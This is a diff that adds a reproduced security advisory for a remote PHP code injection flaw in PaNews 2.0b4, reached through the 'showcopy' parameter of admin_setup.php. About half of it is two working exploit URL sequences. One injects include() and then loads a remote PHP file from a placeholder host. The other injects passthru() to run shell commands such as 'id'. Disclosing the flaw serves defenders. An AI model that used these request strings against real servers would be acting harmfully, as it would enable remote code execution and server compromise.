@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/12611/info
+
+PaNews is reported prone to a remote PHP script code execution vulnerability. It is reported that PHP script code may be injected into the PaNews software through the 'showcopy' parameter of the 'admin_setup.php' script.
+
+Reports indicate that when malicious script code is injected, this code can then be forced to execute in the context of the web service that is hosting the affected software.
+
+This vulnerability is reported to affect PaNews version 2.0b4, other versions might also be affected. 
+
+Example 1
+
+http://www.example.com/panews/includes/admin_setup.php?access[]=admins&do=updatesets&form[comments]=$nst&form[autoapprove]=$nst&disvercheck=$nst&installed=$asd&showcopy=include($nst)
+
+then:
+
+http://www.example.com/panews/includes/config.php?nst=http://your/file.php
+
+
+Example 2
+
+http://www.example.com/panews/includes/admin_setup.php?access[]=admins&do=updatesets&form[comments]=$nst&form[autoapprove]=$nst&disvercheck=$nst&installed=$asd&showcopy=passthru($nst)
+
+then:
+
+http://www.example.com/panews/includes/config.php?nst=id 
